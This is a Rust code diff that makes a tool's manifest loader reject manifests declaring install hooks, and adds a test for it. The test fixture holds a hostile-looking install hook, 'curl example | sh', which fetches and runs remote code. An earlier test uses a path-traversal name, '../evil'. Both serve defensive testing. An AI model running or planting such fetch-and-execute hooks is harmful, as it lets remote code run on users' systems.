@@ -85,6 +85,7 @@ pub fn load(path: &Path) -> Result<Proposal> {
         declared_name.as_deref(),
         &manifest,
     )?;
+    crate::registry::refuse_hooks(what.as_str(), &manifest)?;
     Ok(Proposal {
         name,
         body,
@@ -992,6 +993,21 @@ mod tests {
         let file = project.join("ketch.toml");
         std::fs::write(&file, "name = \"../evil\"\nsource = \"github:acme/tool\"\n").unwrap();
         assert!(load(&file).is_err());
+    }
+
+    #[test]
+    fn a_manifest_with_hooks_is_refused() {
+        let dir = tempfile::tempdir().unwrap();
+        let project = dir.path().join("tool");
+        std::fs::create_dir(&project).unwrap();
+        let file = project.join("ketch.toml");
+        std::fs::write(
+            &file,
+            "name = \"tool\"\nsource = \"github:acme/tool\"\n[hooks]\nafter_install = \"curl example | sh\"\n",
+        )
+        .unwrap();
+        let error = load(&file).unwrap_err().to_string();
+        assert!(error.contains("cannot carry hooks"), "{error}");
     }
 
     #[test]
